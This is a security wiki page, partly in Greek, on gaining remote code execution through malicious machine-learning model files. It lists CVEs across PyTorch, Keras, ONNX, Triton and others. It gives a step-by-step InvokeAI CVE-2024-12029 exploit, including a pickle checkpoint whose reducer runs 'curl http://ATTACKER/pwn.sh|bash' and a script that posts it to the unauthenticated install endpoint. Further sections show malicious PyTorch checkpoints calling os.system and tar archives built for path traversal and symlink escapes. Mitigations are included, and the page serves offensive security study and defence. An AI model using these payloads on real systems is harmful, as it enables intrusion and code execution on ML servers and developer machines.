# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle σε model checkpoint προκαλεί code execution (παρακάμπτοντας το `weights_only` safeguard)                                | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + κακόβουλο model download προκαλεί code execution; Java deserialization RCE στο management API                                    | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint ενεργοποιεί pickle reducer κατά το `load_model_trainer_states_from_checkpoint` → code execution στον ML worker        | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Φόρτωση model από YAML χρησιμοποιεί `yaml.unsafe_load` (code exec) <br> Φόρτωση μοντέλου με **Lambda** layer εκτελεί αυθαίρετο Python code | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Κατασκευασμένο `.tflite` model ενεργοποιεί integer overflow → heap corruption (πιθανό RCE)                                              | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Φόρτωση model μέσω `joblib.load` εκτελεί pickle με τον επιθετικού `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Το `numpy.load` by default επέτρεπε pickled object arrays – κακόβουλο `.npy/.npz` ενεργοποιεί code exec                                | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Το external-weights path σε ONNX model μπορεί να ξεφύγει από directory (διαβάζει αρχεία) <br> Κακόβουλο ONNX model tar μπορεί να αντικαταστήσει αρχεία (οδηγεί σε RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model με custom operator απαιτεί φορτωμα native κώδικα του attacker; πολύπλοκα model graphs μπορούν να καταχραστούν λογική για να εκτελέσουν μη επιθυμητούς υπολογισμούς | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Χρήση του model-load API με `--model-control` ενεργό επιτρέπει relative path traversal για εγγραφή αρχείων (π.χ., overwrite `.bashrc` για RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Κατεστραμμένο GGUF model file προκαλεί heap buffer overflows στον parser, επιτρέποντας arbitrary code execution στο σύστημα του θύματος | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Κακόβουλο HDF5 (`.h5`) model με Lambda layer συνεχίζει να εκτελείται κατά το load (Keras safe_mode δεν καλύπτει το παλιό format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Πολλά ML tools (π.χ., pickle-based model formats, Python `pickle.load`) θα εκτελέσουν arbitrary code embedded σε model files εκτός κι αν μετριαστούν | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το αρχείο που παρέχεται είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το URL που ελέγχεται από τον χρήστη, ένας επιτιθέμενος μπορεί να ενσωματώσει ένα κακόβουλο αντικείμενο με προσαρμοσμένη μέθοδο `__reduce__` μέσα στο checkpoint; η μέθοδος εκτελείται **during deserialization**, οδηγώντας σε **remote code execution (RCE)** στον server του InvokeAI.

Η ευπάθεια αποδόθηκε ως **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Βήμα προς βήμα εκμετάλλευσης

1. Δημιουργήστε ένα κακόβουλο checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Προκαλέστε το ευάλωτο endpoint (δεν απαιτείται authentication):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί `torch.load()` → το gadget `os.system` εκτελείται και ο επιτιθέμενος αποκτά εκτέλεση κώδικα στο πλαίσιο της διεργασίας InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη ροή.

#### Συνθήκες

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` προσβάσιμο από τον επιτιθέμενο  
•  Η διεργασία έχει δικαιώματα για εκτέλεση εντολών shell

#### Μέτρα μετριασμού

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – το patch θέτει `scan=True` ως προεπιλογή και εκτελεί σάρωση για malware πριν από την αποσειριοποίηση.
* Κατά τη φόρτωση checkpoints προγραμματιστικά χρησιμοποιήστε `torch.load(file, weights_only=True)` ή τον νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Επιβάλετε allow-lists / signatures για πηγές μοντέλων και εκτελέστε την υπηρεσία με least-privilege.

> ⚠️ Να θυμάστε ότι **οποιοδήποτε** Python pickle-based format (συμπεριλαμβανομένων πολλών `.pt`, `.pkl`, `.ckpt`, `.pth` αρχείων) είναι εγγενώς μη ασφαλές για αποσειριοποίηση από μη αξιόπιστες πηγές.

---

Παράδειγμα προσωρινής μετρίασης αν πρέπει να διατηρήσετε παλαιότερες εκδόσεις InvokeAI να τρέχουν πίσω από έναν reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Η Transformers4Rec της NVIDIA (μέρος του Merlin) αποκάλυψε έναν μη ασφαλή φορτωτή checkpoint που καλούσε απευθείας `torch.load()` σε μονοπάτια που παρέχονται από τον χρήστη. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint ελεγχόμενο από επιτιθέμενο μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την αποσειριοποίηση.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: In Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει μια callable και ορίσματα. Η callable εκτελείται κατά το unpickling. Αν ένα τέτοιο αντικείμενο υπάρχει σε ένα checkpoint, τρέχει πριν χρησιμοποιηθούν οποιαδήποτε weights.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Δίαυλοι παράδοσης και ακτίνα επίπτωσης:
- Trojanized checkpoints/models που κοινοποιούνται μέσω repos, buckets ή artifact registries
- Αυτοματοποιημένα resume/deploy pipelines που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση συμβαίνει εντός training/inference workers, συχνά με αυξημένα προνόμια (π.χ. root σε containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε το άμεσο `torch.load()` με έναν περιορισμένο, allow-listed deserializer υλοποιημένο στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει types/fields και αποτρέπει την εκτέλεση αυθαίρετων callables κατά τη διάρκεια του load.

Κατευθύνσεις άμυνας ειδικά για PyTorch checkpoints:
- Μην unpickle μη αξιόπιστα δεδομένα. Προτιμήστε μη-εκτελέσιμα formats όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX όταν είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε PyTorch serialization, βεβαιωθείτε ότι `weights_only=True` (υποστηρίζεται σε νεότερο PyTorch) ή χρησιμοποιήστε έναν custom allow-listed unpickler παρόμοιο με το patch του Transformers4Rec.
- Επιβάλετε provenance/signatures του μοντέλου και sandbox deserialization (seccomp/AppArmor; non-root user; περιορισμένο FS και no network egress).
- Παρακολουθήστε για απροσδόκητες child processes από ML services κατά τη φόρτωση checkpoint; trace χρήση `torch.load()`/`pickle`.

POC και αναφορές ευπάθειας/patch:
- Ευάλωτος loader πριν από το patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Κακόβουλο checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Loader μετά το patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Παράδειγμα – δημιουργία κακόβουλου PyTorch μοντέλου

- Δημιουργήστε το μοντέλο:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φόρτωση του μοντέλου:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Μοντέλα για Path Traversal

Όπως σχολιάστηκε στο [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε αρχεία (archives), συνήθως `.zip`. Επομένως, μπορεί να είναι δυνατό να καταχραστεί κανείς αυτές τις μορφές για να πραγματοποιήσει path traversal attacks, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το μοντέλο.

Για παράδειγμα, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον `/tmp` κατάλογο όταν φορτωθεί:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα symlink προς τον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Εμβάθυνση: Keras .keras deserialization και gadget hunting

Για έναν στοχευμένο οδηγό σχετικά με τα .keras internals, Lambda-layer RCE, το ζήτημα arbitrary import σε ≤ 3.8, και την ανακάλυψη gadgets μετά τη διόρθωση μέσα στην allowlist, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Αναφορές

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
